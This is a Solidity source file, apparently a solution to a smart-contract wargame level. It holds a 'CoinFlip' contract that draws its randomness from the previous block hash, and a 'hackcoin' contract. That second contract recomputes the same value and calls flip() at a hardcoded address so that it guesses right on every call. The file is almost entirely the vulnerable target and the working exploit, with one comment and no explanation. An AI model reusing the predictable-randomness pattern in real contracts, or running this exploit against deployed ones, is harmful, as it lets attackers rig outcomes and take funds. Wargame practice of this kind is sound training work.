pragma solidity ^0.6.0; 

import "github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.4.0/contracts/math/SafeMath.sol";
//Guessing coin flip result 10 times
contract CoinFlip {

  using SafeMath for uint256;
  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() public {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue.div(FACTOR);
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}


contract hackcoin {
    using SafeMath for uint256;
    CoinFlip public originalContract = CoinFlip(0xf7B14a2a63F81133e6b193BFdE9B509Ba258A9B7); 
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function hackFlip() public {
         uint256 blockValue = uint256(blockhash(block.number.sub(1)));
         uint256 coinFlip = blockValue.div(FACTOR);
         bool _guess = coinFlip == 1 ? true : false;
         originalContract.flip(_guess);
    }
}